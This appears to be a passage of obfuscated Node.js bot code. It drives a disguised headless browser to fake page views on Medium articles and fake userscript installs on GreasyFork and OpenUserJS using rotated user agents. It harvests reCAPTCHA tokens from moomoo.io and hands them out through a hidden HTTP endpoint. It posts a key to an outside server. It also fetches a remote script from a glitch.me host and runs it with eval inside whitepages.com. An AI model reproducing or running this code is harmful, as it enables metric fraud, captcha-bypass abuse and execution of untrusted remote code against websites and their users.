      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + V(0xd, 'oIQ^') + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + T(0x1b) + 'pts/456855' + W(0xf) + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + T(0x1a) + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + V(0x1f, 'r3!s') + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + W(0x4) + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + V(0x3, 'yV]h') + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + V(0x13, 'yV]h') + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + W(0x6) + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    T(0x0) + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x24ce + -0x1772 + -0xf10 * -0x4
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const ba = {
        f: 0x15
      },
      Y = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1f7a + 0xbd7 * 0x1 + 0x13a3)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x14fe * -0x1 + 0xa4f * 0x1 + 0xb13), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x23bb * -0x1 + -0x613 + 0x1 * 0x2a32), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1777 + -0x2 * 0x7c + -0x167f;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1fbc + -0x6b * -0x5b + -0x1 * 0x45c5; w < getRandomInt(0x1eaf + -0x55d * 0x3 + -0xe97, 0xf9f + -0x225e + 0x4b1 * 0x4); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x5cef + -0x8f75 * 0x1 + 0x8e73 * 0x2);
        }
      }();
    }, 0x1a * -0x137 + -0x24 * 0xdf + 0x3f56), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        const X = b;
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + X(0xc, '5iif')],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0xcd7 + 0x5 * 0xb5 + -0x1060;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x3 * -0x8fa + 0x1 * -0x172c + -0x3c2 * 0x1, 0x218f + -0x1bf0 + -0x56d)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x5 * 0x25 + -0x2233 * -0x4 + 0x1 * -0x12e3);
    }, -0x5 * -0x7b5 + 0x1403 + -0x3a28), doFlags['doWhitepag' + Y(ba.f)] && setTimeout(async () => {
      (async function r() {
        const a0 = c,
          Z = b;
        try {
          let s = 0x24b4 + 0x1 * -0x1359 + -0x115b;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u[Z(0x1, 'Upwj')](a0(0x22) + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1 * 0x1a0 + 0x5 * -0x2f5 + -0x1c21 * -0x1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0xdeb + -0x1 * 0xa8 + 0xe93), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x72136 * -0x1 + -0x2697e * 0x7 + -0x177cdc * -0x1);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0xe47 + 0x1 * 0x1565 + -0x2348);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a1 = d,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1acd + -0xb6c + 0x25 * -0x65);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + a1(0x1c) + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x14b9 * 0x1 + 0xd * -0x1b9 + -0x4 * -0x84f);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = c,
    a2 = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0xcc + 0x1 * 0x12b9 + -0x4e1 * 0x4) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x39 * -0xab + 0xe4f + 0x5 * 0x4c1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1216 + 0x77c + -0x17 * -0x76, D['indexOf']('\x20'));
        return B ? E['slice'](-0x5 * -0x89 + -0x1 * 0x1cea + 0x1a3d, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x1f * -0xab + 0x799 * -0x3 + -0x2926 * -0x1),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x14a7 * -0x2 + -0x2b33 + -0x11a7 * -0x7),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + a2(0xa, 'b2nL') + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + a2(0x16, '$46K') + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + a2(0xb, '9CLs') + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + a3(0x8) + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
